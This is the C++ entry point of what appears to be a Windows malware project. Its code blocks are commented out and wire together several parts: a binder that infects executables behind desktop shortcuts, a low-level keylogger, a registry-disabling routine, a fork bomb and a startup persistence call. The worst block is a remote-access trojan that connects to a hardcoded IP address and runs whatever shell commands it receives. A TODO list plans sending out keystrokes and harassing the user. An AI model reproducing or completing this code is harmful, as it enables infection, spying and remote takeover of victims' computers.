#include "Reality.hpp"

#include <iostream>
#include <thread>

int	main(int argc, char** argv) {
	// Virus -> Trojan
	/*EXEBinder exeBinder;
	if(exeBinder.AmIBinded(argv[0])) {
		exeBinder.Open(argv[0]);

		return EXIT_SUCCESS;
	}

	std::vector<std::string> paths;
	Miscellaneous miscellaneous;
	miscellaneous.GetAllShortcutsTargetFromDesktop(paths);
	miscellaneous.PIDToPathAll(paths);
	std::for_each(paths.begin(), paths.end(), [&exeBinder, argv] (std::string& file) {
		std::vector<std::string> files { file };
		exeBinder.Bind(files, file, argv[0]);
	});*/



	// Spyware
	/*std::thread threadKeylogger([] {
		std::function<void(PKBDLLHOOKSTRUCT)> klCallback = [] (PKBDLLHOOKSTRUCT key) {
			std::cout << Keylogger::vkCodesAll[key->vkCode] << " ";
		};
		Keylogger kl(klCallback);

		while(kl.Update());
	});
	threadKeylogger.detach();*/



	// RAT (Remote Access Trojan / rootkit)
	/*std::thread threadRAT([] {
		BClient bClient(DefaultSocketConfigurations::TCP, 32406, "162.55.32.18");
		bClient.Connect();
		bClient.ReceiveData();
		bClient.SendData("None");

		std::string command;
		while(!(command = bClient.ReceiveData()).empty()) {
			bClient.SendData(Miscellaneous::System(command));
		}
	});
	threadRAT.detach();*/



	// Fileless
	/*Registry registry;
	registry.DisableAll(true);*/



	// Logic, Fork, Zip, Null bomb (http://www.rohitab.com/discuss/topic/43395-c-logic-bomb-monday-virus) (.) (.) (http://www.rohitab.com/discuss/topic/41026-null-bomb)
	/*Bomb bomb;
	bomb.DeployFork();*/



	// https://docs.microsoft.com/en-us/windows/win32/taskschd/boot-trigger-example--c---
	// Miscellaneous
	/*Miscellaneous::AddMeToStartup("Update", argv[0]);*/



	while(true) {
		Sleep(1);
	}

	return EXIT_SUCCESS;
}

/*
	TO DO:
		Virus -> Trojan:
			- check every n minutes for new exe paths

		Spyware:
			- save or send them somewhere the data

		RAT/rootkit:
			- finish the server (WORKING ON)

		Miscellaneous:
			- move cursor randomly every n minutes n times
			- screen melter
			- log out randomly
*/